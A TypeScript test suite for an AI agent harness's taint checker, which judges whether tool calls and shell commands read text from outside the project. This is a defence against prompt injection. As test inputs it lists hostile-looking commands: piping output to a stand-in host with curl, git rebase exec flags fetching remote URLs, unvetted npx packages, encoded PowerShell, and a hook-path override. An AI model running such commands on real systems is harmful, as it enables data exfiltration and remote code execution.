import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, rmSync } from 'node:fs';
import { tmpdir, homedir } from 'node:os';
import { join } from 'node:path';
import { judgesTool, outsidePathReason, toolTaintReason } from '../src/core/outside-text.js';

/** A project folder with a src file, a node_modules file and a nested clone; plus a sibling folder that is not part of the project. */
function rig() {
  const base = mkdtempSync(join(tmpdir(), 'legion-outside-'));
  const proj = join(base, 'proj');
  const other = join(base, 'other');
  mkdirSync(join(proj, 'src'), { recursive: true });
  mkdirSync(join(proj, 'node_modules', 'left-pad'), { recursive: true });
  mkdirSync(join(proj, 'tools', 'cloned', '.git'), { recursive: true });
  mkdirSync(join(proj, '.git'), { recursive: true });
  mkdirSync(other, { recursive: true });
  writeFileSync(join(proj, 'src', 'a.ts'), 'x');
  writeFileSync(join(proj, 'node_modules', 'left-pad', 'index.js'), 'x');
  writeFileSync(join(proj, 'tools', 'cloned', 'README.md'), 'x');
  writeFileSync(join(other, 'README.md'), 'x');
  return { base, proj, other, done: () => rmSync(base, { recursive: true, force: true }) };
}

const ctx = (proj: string) => ({ cwd: proj, roots: [proj] });

test('T1: a file inside the project, absolute or relative, is not outside text', () => {
  const r = rig();
  try {
    assert.equal(outsidePathReason(join(r.proj, 'src', 'a.ts'), ctx(r.proj)), undefined);
    assert.equal(outsidePathReason('src/a.ts', ctx(r.proj)), undefined);
    assert.equal(outsidePathReason(join(r.proj, 'src', 'not-yet.ts'), ctx(r.proj)), undefined, 'a path that does not exist yet is judged by where it would be');
    assert.equal(outsidePathReason(r.proj, ctx(r.proj)), undefined);
  } finally { r.done(); }
});

test('T2: a file outside the project, or a ../ escape, is outside text', () => {
  const r = rig();
  try {
    assert.match(outsidePathReason(join(r.other, 'README.md'), ctx(r.proj)) ?? '', /outside/);
    assert.match(outsidePathReason('../other/README.md', ctx(r.proj)) ?? '', /outside/);
    assert.match(outsidePathReason(join(r.other, 'missing.md'), ctx(r.proj)) ?? '', /outside/);
    assert.match(outsidePathReason('~/notes.md', ctx(r.proj)) ?? '', /outside/);
  } finally { r.done(); }
});

test('T3: a shortcut inside the project that points outside is judged by where it leads', () => {
  const r = rig();
  try {
    const link = join(r.proj, 'linked');
    symlinkSync(r.other, link, 'junction');
    assert.match(outsidePathReason(join(link, 'README.md'), ctx(r.proj)) ?? '', /outside/);
    assert.match(outsidePathReason('linked/README.md', ctx(r.proj)) ?? '', /outside/);
  } finally { r.done(); }
});

test('T4: third-party code inside the project (node_modules, vendor) and a nested clone count as outside text', () => {
  const r = rig();
  try {
    assert.match(outsidePathReason(join(r.proj, 'node_modules', 'left-pad', 'index.js'), ctx(r.proj)) ?? '', /third-party/);
    assert.match(outsidePathReason('vendor/lib/x.c', ctx(r.proj)) ?? '', /third-party/);
    assert.match(outsidePathReason(join(r.proj, 'tools', 'cloned', 'README.md'), ctx(r.proj)) ?? '', /another repository/);
    assert.match(outsidePathReason(join(r.proj, '.git', 'HEAD'), ctx(r.proj)) ?? '', /third-party/, 'the git data folder holds branch names and hooks other people wrote');
  } finally { r.done(); }
});

test('T5: a project run from a folder that is itself a git worktree (a .git file at the root) still counts its own files as inside', () => {
  const r = rig();
  try {
    const wt = join(r.base, 'wt');
    mkdirSync(join(wt, 'src'), { recursive: true });
    writeFileSync(join(wt, '.git'), 'gitdir: /somewhere');
    writeFileSync(join(wt, 'src', 'a.ts'), 'x');
    assert.equal(outsidePathReason(join(wt, 'src', 'a.ts'), ctx(wt)), undefined);
  } finally { r.done(); }
});

test('T6: with no folder to be inside of, a path is outside', () => {
  const r = rig();
  try {
    assert.match(outsidePathReason(join(r.proj, 'src', 'a.ts'), { cwd: r.proj, roots: [] }) ?? '', /outside/);
  } finally { r.done(); }
});

test('W1: another worktree of the same repository is inside; a foreign clone next to it is not', () => {
  const r = rig();
  try {
    const main = join(r.base, 'main');
    mkdirSync(join(main, '.git', 'worktrees', 'wt1'), { recursive: true });
    mkdirSync(join(main, '.git', 'worktrees', 'x'), { recursive: true });
    mkdirSync(join(main, 'src'), { recursive: true });
    writeFileSync(join(main, 'src', 'a.ts'), 'x');
    const wt = join(r.base, 'wt1');
    mkdirSync(join(wt, 'src'), { recursive: true });
    writeFileSync(join(wt, '.git'), `gitdir: ${join(main, '.git', 'worktrees', 'wt1').replace(/\\/g, '/')}\n`);
    // git writes the way back: the main repository names the worktree's .git file
    writeFileSync(join(main, '.git', 'worktrees', 'wt1', 'gitdir'), join(wt, '.git'));
    writeFileSync(join(wt, 'src', 'a.ts'), 'x');
    // a folder that only CLAIMS to be a worktree of the project (a planted .git file, nobody points back) is somebody else's folder
    const fake = join(r.base, 'fake');
    mkdirSync(join(fake, 'src'), { recursive: true });
    writeFileSync(join(fake, '.git'), `gitdir: ${join(main, '.git', 'worktrees', 'nope').replace(/\\/g, '/')}\n`);
    writeFileSync(join(fake, 'src', 'a.ts'), 'x');
    const fake2 = join(r.base, 'fake2');
    mkdirSync(join(fake2, 'src'), { recursive: true });
    writeFileSync(join(fake2, '.git'), `gitdir: ${join(main, '.git', 'worktrees', 'wt1').replace(/\\/g, '/')}\n`);
    writeFileSync(join(fake2, 'src', 'a.ts'), 'x');
    assert.match(outsidePathReason(join(fake, 'src', 'a.ts'), ctx(main)) ?? '', /outside/, 'the named worktree does not exist');
    assert.match(outsidePathReason(join(fake2, 'src', 'a.ts'), ctx(main)) ?? '', /outside/, 'the named worktree points back at a different folder');
    const foreign = join(r.base, 'foreign');
    mkdirSync(join(foreign, '.git'), { recursive: true });
    mkdirSync(join(foreign, 'src'), { recursive: true });
    writeFileSync(join(foreign, 'src', 'a.ts'), 'x');
    assert.equal(outsidePathReason(join(wt, 'src', 'a.ts'), ctx(main)), undefined, 'a worktree beside the project, seen from the main folder');
    assert.equal(outsidePathReason(join(main, 'src', 'a.ts'), ctx(wt)), undefined, 'the main folder, seen from a worktree');
    assert.match(outsidePathReason(join(foreign, 'src', 'a.ts'), ctx(main)) ?? '', /outside/);
    // a worktree nested inside the project is the project, not a clone
    const nested = join(main, '.claude', 'worktrees', 'x');
    mkdirSync(join(nested, 'src'), { recursive: true });
    writeFileSync(join(nested, '.git'), `gitdir: ${join(main, '.git', 'worktrees', 'x').replace(/\\/g, '/')}\n`);
    writeFileSync(join(main, '.git', 'worktrees', 'x', 'gitdir'), join(nested, '.git'));
    writeFileSync(join(nested, 'src', 'a.ts'), 'x');
    assert.equal(outsidePathReason(join(nested, 'src', 'a.ts'), ctx(main)), undefined);
  } finally { r.done(); }
});

test('N1: a search or listing aimed at the nested clone folder itself is judged like a file in it', () => {
  const r = rig();
  try {
    assert.match(outsidePathReason(join(r.proj, 'tools', 'cloned'), ctx(r.proj)) ?? '', /another repository/);
    assert.match(outsidePathReason('tools/cloned', ctx(r.proj)) ?? '', /another repository/);
    assert.equal(outsidePathReason(join(r.proj, 'src'), ctx(r.proj)), undefined);
    assert.equal(outsidePathReason(r.proj, ctx(r.proj)), undefined);
  } finally { r.done(); }
});

test('P1: the output a run spilled to its own tool-results folder was already judged when it was made', () => {
  const r = rig();
  try {
    const spill = join(r.base, '.claude', 'projects', 'c--work-proj', 'sess-1', 'tool-results');
    mkdirSync(spill, { recursive: true });
    writeFileSync(join(spill, 'toolu_1.txt'), 'x');
    writeFileSync(join(r.base, '.claude', 'projects', 'c--work-proj', 'sess-1', 'other.txt'), 'x');
    const mine = { ...ctx(r.proj), home: r.base };
    assert.equal(outsidePathReason(join(spill, 'toolu_1.txt'), mine), undefined);
    assert.match(outsidePathReason(join(r.base, '.claude', 'projects', 'c--work-proj', 'sess-1', 'other.txt'), mine) ?? '', /outside/);
    assert.match(outsidePathReason(join(r.base, '.claude', 'settings.json'), mine) ?? '', /outside/);
    // the same layout anywhere else is not the spill folder: inside a dependency, next to the project, or with no home given
    const lookalike = (root: string) => { const d = join(root, '.claude', 'projects', 'a', 'b', 'tool-results'); mkdirSync(d, { recursive: true }); writeFileSync(join(d, 'inject.txt'), 'x'); return join(d, 'inject.txt'); };
    assert.match(outsidePathReason(lookalike(join(r.proj, 'node_modules', 'evilpkg')), mine) ?? '', /third-party/);
    assert.match(outsidePathReason(lookalike(r.other), mine) ?? '', /outside/);
    assert.match(outsidePathReason(join(spill, 'toolu_1.txt'), ctx(r.proj)) ?? '', /outside/, 'no home given: nothing is the spill folder');
  } finally { r.done(); }
});

test('B1: output of a background shell was judged when the command started, so it does not taint in local mode', () => {
  const r = rig();
  try {
    const base = { cwd: r.proj, roots: [r.proj], home: homedir(), outsideFiles: true };
    for (const name of ['BashOutput', 'KillShell', 'TaskOutput']) {
      assert.equal(judgesTool(name), true, name);
      assert.equal(toolTaintReason({ ...base, toolName: name, input: { bash_id: 'x' }, shell: 'local' }), undefined, name);
      assert.ok(toolTaintReason({ ...base, toolName: name, input: { bash_id: 'x' }, shell: 'strict' }), name + ' in strict mode');
    }
    assert.equal(judgesTool('WebFetch'), false);
    assert.equal(judgesTool('Bash'), true);
    assert.equal(judgesTool('Read'), true);
  } finally { r.done(); }
});

test('SP1: a shell command that names a path through a shortcut or into a cloned repository taints; ordinary relative words do not', () => {
  const r = rig();
  try {
    symlinkSync(r.other, join(r.proj, 'linked'), 'junction');
    const run = (command: string) => toolTaintReason({ toolName: 'Bash', input: { command }, cwd: r.proj, roots: [r.proj], home: homedir(), shell: 'local', outsideFiles: true });
    assert.ok(run('cat linked/README.md'));
    assert.ok(run('cat tools/cloned/README.md'));
    assert.ok(run('rg foo tools/cloned'));
    assert.equal(run('rg foo src'), undefined);
    assert.equal(run('git log origin/main..HEAD'), undefined);
    assert.equal(run('git diff src/a.ts'), undefined);
    assert.equal(run('git checkout feat/x'), undefined);
  } finally { r.done(); }
});

const sh = (command: string, extra: Partial<Parameters<typeof toolTaintReason>[0]> = {}) => {
  const r = rig();
  try {
    return toolTaintReason({ toolName: 'Bash', input: { command }, cwd: r.proj, roots: [r.proj], home: homedir(), shell: 'local', outsideFiles: true, ...extra });
  } finally { r.done(); }
};

test('S1: local project commands do not taint in local mode', () => {
  for (const c of ['git status', 'git diff --stat', 'git log --oneline -5', 'git add -A', 'git commit -m "x"', 'git push origin feat/x', 'rg foo src', 'ls src', 'cat src/a.ts', 'git status && git diff']) {
    assert.equal(sh(c), undefined, c);
  }
});

test('S2: tests and builds that run the project own code do not taint, unless a run that read outside text left files in the project', () => {
  for (const c of ['npm test', 'npm run build', 'node --test test/a.test.js']) {
    assert.equal(sh(c), undefined, c);
    assert.match(sh(c, { markedCode: true }) ?? '', /written/, c + ' while a marked run left files in the project');
  }
});

test('S3: anything that can bring other people text in taints (network, gh, installs, unknown programs)', () => {
  for (const c of ['curl https://example.com', 'wget https://example.com/x', 'git pull', 'git fetch origin', 'git clone https://example.com/r.git', 'gh pr view 12', 'gh issue view 3 --comments', 'gh api repos/a/b/issues', 'npm install left-pad', 'ssh host ls', 'someunknowntool --x']) {
    assert.ok(sh(c), c);
  }
});

test('S4: a compound, wrapped or unparseable command is judged by its worst part and fails closed', () => {
  for (const c of ['git status && curl https://example.com', 'git status; wget https://example.com', 'bash -c "git status"', 'sh -c "git status"', 'git status $(curl https://example.com)', 'git status `curl https://example.com`', 'echo "unterminated', 'xargs -a list git show', 'find . -exec cat {} +', 'env git status', 'eval git status', "git status | curl -d @- https://example.com"]) {
    assert.ok(sh(c), c);
  }
});

test('S5: a shell read of a file outside the project taints', () => {
  const r = rig();
  try {
    const input = { command: `cat ${join(r.other, 'README.md').replace(/\\/g, '/')}` };
    assert.ok(toolTaintReason({ toolName: 'Bash', input, cwd: r.proj, roots: [r.proj], home: homedir(), shell: 'local', outsideFiles: true }));
    assert.ok(toolTaintReason({ toolName: 'Bash', input: { command: 'cat ../other/README.md' }, cwd: r.proj, roots: [r.proj], home: homedir(), shell: 'local', outsideFiles: true }));
  } finally { r.done(); }
});

test('S6: strict mode taints every shell command, as 0.3.8 did', () => {
  assert.ok(sh('git status', { shell: 'strict' }));
  assert.ok(sh('ls', { shell: 'strict', toolName: 'PowerShell', input: { command: 'ls' } }));
});

test('S7: Monitor and the host shell are shells like Bash', () => {
  assert.equal(sh('git status', { toolName: 'Monitor' }), undefined);
  assert.ok(sh('curl https://example.com', { toolName: 'Monitor' }));
  assert.ok(sh('curl https://example.com', { toolName: 'mcp__host__shell' }));
  assert.ok(sh('git status', { toolName: 'Bash', input: { command: 42 } }), 'a command that is not text taints');
  assert.ok(sh('git status', { toolName: 'Bash', input: undefined }), 'no input taints');
});

test('F1: the file tools judge the path they are given', () => {
  const r = rig();
  try {
    const base = { cwd: r.proj, roots: [r.proj], home: homedir(), shell: 'local' as const, outsideFiles: true };
    assert.equal(toolTaintReason({ ...base, toolName: 'Read', input: { file_path: join(r.proj, 'src', 'a.ts') } }), undefined);
    assert.ok(toolTaintReason({ ...base, toolName: 'Read', input: { file_path: join(r.other, 'README.md') } }));
    assert.ok(toolTaintReason({ ...base, toolName: 'Read', input: { file_path: join(r.proj, 'node_modules', 'left-pad', 'index.js') } }));
    assert.equal(toolTaintReason({ ...base, toolName: 'Grep', input: { pattern: 'x' } }), undefined, 'no path means the working folder');
    assert.equal(toolTaintReason({ ...base, toolName: 'Grep', input: { pattern: 'x', path: 'src' } }), undefined);
    assert.ok(toolTaintReason({ ...base, toolName: 'Grep', input: { pattern: 'x', path: r.other } }));
    assert.ok(toolTaintReason({ ...base, toolName: 'Glob', input: { pattern: join(r.other, '**', '*.md').replace(/\\/g, '/') } }));
    assert.equal(toolTaintReason({ ...base, toolName: 'Glob', input: { pattern: 'src/**/*.ts' } }), undefined);
    assert.ok(toolTaintReason({ ...base, toolName: 'LS', input: { path: r.other } }));
    assert.ok(toolTaintReason({ ...base, toolName: 'mcp__host__read_file', input: { path: join(r.other, 'README.md') } }));
    assert.equal(toolTaintReason({ ...base, toolName: 'mcp__host__read_file', input: { path: 'src/a.ts' } }), undefined);
    assert.ok(toolTaintReason({ ...base, toolName: 'Read', input: {} }), 'a read with no readable path taints');
  } finally { r.done(); }
});

test('F2: outsideFiles off leaves file reads clean', () => {
  const r = rig();
  try {
    assert.equal(toolTaintReason({ toolName: 'Read', input: { file_path: join(r.other, 'README.md') }, cwd: r.proj, roots: [r.proj], home: homedir(), shell: 'local', outsideFiles: false }), undefined);
  } finally { r.done(); }
});

test('S8: a program that runs code given on its command line taints (it can do anything, including fetch)', () => {
  for (const c of ['node -e "fetch(1)"', 'node --eval "x"', 'node -p 1', 'bun -e x', 'deno eval x', 'perl -e x', 'ruby -e x', 'php -r x', 'python -c "print(1)"', 'python3 -c x', 'pwsh -Command x', 'powershell -EncodedCommand AAAA']) {
    assert.ok(sh(c), c);
  }
});

test('S9: everyday local git (checkout, switch, stash, restore, reset, rebase, tag, worktree) does not taint, but a way to run another command does', () => {
  for (const c of ['git checkout main', 'git checkout -b feat/x', 'git switch main', 'git stash', 'git stash pop', 'git restore src/a.ts', 'git reset --hard HEAD~1', 'git rebase main', 'git cherry-pick abc123', 'git tag v1', 'git worktree add ../wt feat/x', 'git rev-parse HEAD', 'git ls-files', 'git merge-base main HEAD']) {
    assert.equal(sh(c), undefined, c);
  }
  for (const c of ['git checkout main && curl https://example.com', 'git rebase -x "curl https://example.com" main', 'git rebase --exec x main', 'git -c core.hooksPath=/tmp/x checkout main', 'git checkout $(curl https://example.com)', 'git stash; wget https://example.com']) {
    assert.ok(sh(c), c);
  }
});

test('S10: gh calls that only make or finish our own work do not taint; gh calls that read other people text do', () => {
  for (const c of ['gh pr create --fill', 'gh pr create --title "x" --body "y"', 'gh pr ready 5', 'gh pr checks 5', 'gh run watch 123', 'gh run rerun 123']) {
    assert.equal(sh(c), undefined, c);
  }
  for (const c of ['gh pr view 5', 'gh pr list', 'gh issue view 3', 'gh issue list', 'gh api repos/a/b', 'gh pr create --fill && curl https://example.com', 'gh extension install a/b', 'gh pr diff 5']) {
    assert.ok(sh(c), c);
  }
});

test('S11: a shell command that names third-party code (node_modules, vendor) taints', () => {
  for (const c of ['rg foo node_modules', 'cat vendor/lib/x.c', 'cat node_modules/left-pad/index.js', 'ls third_party/x', 'cat .git/modules/x/config']) {
    assert.ok(sh(c), c);
  }
  assert.equal(sh('rg foo node_modules', { outsideFiles: false }), undefined, 'the switch for outside files covers shell reads too');
});

/** Findings of the independent review, round 1: each one is a call that must mark the run and did not. */
function rr() {
  const r = rig();
  mkdirSync(join(r.proj, 'node_modules', '.bin'), { recursive: true });
  writeFileSync(join(r.proj, 'node_modules', '.bin', 'tsc'), 'x');
  writeFileSync(join(r.proj, 'node_modules', '.bin', 'tsc.cmd'), 'x');
  symlinkSync(r.other, join(r.proj, 'jn'), 'junction');
  mkdirSync(join(r.proj, 'clone2', '.git'), { recursive: true });
  writeFileSync(join(r.proj, 'clone2', 'README.md'), 'x');
  const run = (command: string, extra: Partial<Parameters<typeof toolTaintReason>[0]> = {}) =>
    toolTaintReason({ toolName: 'Bash', input: { command }, cwd: r.proj, roots: [r.proj], home: homedir(), shell: 'local', outsideFiles: true, ...extra });
  return { r, run };
}

test('R1: a package runner marks the run unless it runs a program that is already installed in the project', () => {
  const { r, run } = rr();
  try {
    for (const c of ['npx --yes evil-pkg', 'npx cowsay hello', 'git status && npx cowsay x', 'npx -p evil tsc', 'npx tsc && npx cowsay x', 'pnpm dlx evil', 'pnpx evil', 'bunx evil', 'npm exec evil', 'yarn dlx evil', 'npx evil-not-installed --version']) {
      assert.ok(run(c), c);
    }
    assert.equal(run('npx tsc --noEmit'), undefined, 'tsc is installed in node_modules/.bin');
    assert.equal(run('npx --no-install tsc --noEmit'), undefined);
  } finally { r.done(); }
});

test('R2: the host shell cwd field is a path like any other', () => {
  const { r } = rr();
  try {
    const base = { cwd: r.proj, roots: [r.proj], home: homedir(), shell: 'local' as const, outsideFiles: true };
    assert.ok(toolTaintReason({ ...base, toolName: 'mcp__host__shell', input: { command: 'cat evil.txt', cwd: r.other } }));
    assert.equal(toolTaintReason({ ...base, toolName: 'mcp__host__shell', input: { command: 'git status', cwd: join(r.proj, 'src') } }), undefined);
  } finally { r.done(); }
});

test('R3: git flags that run another program mark the run, in any spelling; branch-making flags do not', () => {
  const { r, run } = rr();
  try {
    for (const c of ['git rebase -xcurl\\ https://evil/x HEAD~1', 'git rebase --exe id main', 'git rebase --exec id main', 'git rebase --interactive main', 'git rebase -i main', 'git checkout --recurse-submodules main', 'git stash --upload-pack=x', 'git switch --recurse-submodules main']) {
      assert.ok(run(c), c);
    }
    for (const c of ['git switch -c feat/x', 'git checkout -b feat/x', 'git checkout -B feat/x', 'git rebase main', 'git rebase --continue']) {
      assert.equal(run(c), undefined, c);
    }
  } finally { r.done(); }
});

test('R3b: git accepts any unique start of a long option, so every start of a dangerous one marks the run', () => {
  const { r, run } = rr();
  try {
    for (const c of ['git rebase --ex id main', 'git rebase --e id main', 'git rebase --in main', 'git rebase --inter main', 'git checkout --rec main', 'git switch --rec main', 'git checkout --recurse main', 'git stash --upl=x', 'git rebase --exec=id main']) {
      assert.ok(run(c), c);
    }
    for (const c of ['git rebase --continue', 'git rebase --abort', 'git rebase --skip', 'git reset --hard HEAD~1', 'git checkout --detach main', 'git stash --include-untracked', 'git tag --annotate v1 -m x', 'git worktree add --detach ../w main']) {
      assert.equal(run(c), undefined, c);
    }
  } finally { r.done(); }
});

test('R3c: a command with many paths is checked, not given up on; ripgrep type flags are not the ignore flag', () => {
  const { r, run } = rr();
  try {
    const many = Array.from({ length: 300 }, (_, i) => `src/file${i}.ts`).join(' ');
    assert.equal(run(`git add ${many}`), undefined);
    assert.ok(run(`git add ${many} jn/x.md`), 'one path that leads out among 300 still marks');
    assert.equal(run('rg -tus foo src'), undefined);
    assert.equal(run('rg -nH foo src'), undefined);
    assert.ok(run('rg -nuu foo'));
  } finally { r.done(); }
});

test('R5b: more dependency and tool folders count as third-party code', () => {
  const { r } = rr();
  try {
    for (const p of ['dist-packages/x.py', 'Carthage/Checkouts/x/README.md', '.yarn/cache/x.zip', '.terraform/modules/x/main.tf', '.pnpm-store/v3/x']) {
      assert.match(outsidePathReason(p, ctx(r.proj)) ?? '', /third-party/, p);
    }
  } finally { r.done(); }
});

test('R4: a bare word that names a shortcut or a cloned repository in the project folder is judged like a path', () => {
  const { r, run } = rr();
  try {
    for (const c of ['rg foo jn', 'ls jn', 'rg foo clone2', 'cd clone2 && cat README.md']) assert.ok(run(c), c);
    for (const c of ['rg foo src', 'ls src', 'git status', 'cat package.json']) assert.equal(run(c), undefined, c);
  } finally { r.done(); }
});

test('R5: more kinds of third-party code, and the git data folder, are outside text; build output of your own code is not', () => {
  const { r } = rr();
  try {
    for (const p of ['Pods/AFNetworking/README.md', 'third-party/lib/x.c', '.git/config', '.git/hooks/pre-commit', 'node_modules/a/node_modules/b/index.js', 'packages/web/node_modules/x/README.md']) {
      assert.match(outsidePathReason(p, ctx(r.proj)) ?? '', /third-party/, p);
    }
    for (const p of ['dist/app.js', 'target/debug/x', 'src/a.ts', 'docs/readme.md']) assert.equal(outsidePathReason(p, ctx(r.proj)), undefined, p);
  } finally { r.done(); }
});

test('R6: a search that is aimed at third-party code by its glob, or that ignores .gitignore, marks the run', () => {
  const { r, run } = rr();
  try {
    const base = { cwd: r.proj, roots: [r.proj], home: homedir(), shell: 'local' as const, outsideFiles: true };
    assert.ok(toolTaintReason({ ...base, toolName: 'Grep', input: { pattern: 'x', glob: 'node_modules/**' } }));
    assert.ok(toolTaintReason({ ...base, toolName: 'Grep', input: { pattern: 'x', glob: '**/vendor/**' } }));
    assert.equal(toolTaintReason({ ...base, toolName: 'Grep', input: { pattern: 'x', glob: '*.ts' } }), undefined);
    for (const c of ['rg foo -uuu .', 'rg -u foo', 'rg --no-ignore foo', 'rg --unrestricted foo', 'rg foo --hidden -uu']) assert.ok(run(c), c);
    assert.equal(run('rg foo src'), undefined);
  } finally { r.done(); }
});

test('R7: code given to an interpreter through combined or preload flags marks the run', () => {
  const { r, run } = rr();
  try {
    for (const c of ['node -pe "1"', 'node --import ./x.mjs y.js', 'node --env-file=.env x.js', 'node -r ./hook.js x.js', 'node --require ./hook.js x.js', 'python -W ignore -c "print(1)"', 'perl -ne "print"', 'ruby -ne "puts"', 'php -r "echo 1;"']) {
      assert.ok(run(c), c);
    }
    assert.equal(run('node --test test/a.test.js'), undefined);
    assert.equal(run('git status'), undefined);
  } finally { r.done(); }
});

test('R8: while a marked run has left files in the project, any program that runs project files marks the run, not only tests and builds', () => {
  const { r, run } = rr();
  try {
    for (const c of ['node build.js', 'pnpm run dev', 'npm run lint', 'make', 'python x.py', 'bash ./run.sh', 'cargo build', 'go test ./...', 'npx tsc', 'tsx src/a.ts', 'pwsh ./x.ps1']) {
      assert.ok(run(c, { markedCode: true }), c + ' with marked files');
    }
    for (const c of ['git status', 'rg foo src', 'ls', 'git commit -m x', 'git push origin main']) assert.equal(run(c, { markedCode: true }), undefined, c + ' with marked files');
    assert.equal(run('node build.js'), undefined, 'without marked files a project script is trusted, as the notes say');
  } finally { r.done(); }
});

test('R9: gh pr merge can print a title somebody else wrote, so it marks; creating and checking do not', () => {
  const { r, run } = rr();
  try {
    assert.ok(run('gh pr merge 5 --squash'));
    for (const c of ['gh pr create --fill', 'gh pr ready 5', 'gh pr checks 5', 'gh run watch 123']) assert.equal(run(c), undefined, c);
  } finally { r.done(); }
});

test('R10: asking a known program for its version or help does not mark the run, but an unknown program or extra words do', () => {
  const { r, run } = rr();
  try {
    for (const c of ['git --version', 'git version', 'node --version', 'node -v', 'npm --version', 'npm -v', 'pnpm --version', 'yarn --version', 'python --version', 'python3 -V', 'gh --version', 'rg --version', 'cargo --version', 'go version', 'tsc --version', 'java -version', 'git --help', 'node --help']) {
      assert.equal(run(c), undefined, c);
    }
    for (const c of ['./evil --version', 'evil --version', 'node --version && curl https://example.com', 'git --version; wget https://example.com', 'curl --version']) {
      assert.ok(run(c), c);
    }
  } finally { r.done(); }
});

test('F3: tools this module does not judge return undefined (the caller keeps its own rule)', () => {
  const r = rig();
  try {
    assert.equal(toolTaintReason({ toolName: 'Edit', input: { file_path: join(r.other, 'x') }, cwd: r.proj, roots: [r.proj], home: homedir(), shell: 'local', outsideFiles: true }), undefined);
    assert.equal(toolTaintReason({ toolName: 'WebFetch', input: { url: 'https://x' }, cwd: r.proj, roots: [r.proj], home: homedir(), shell: 'local', outsideFiles: true }), undefined);
  } finally { r.done(); }
});
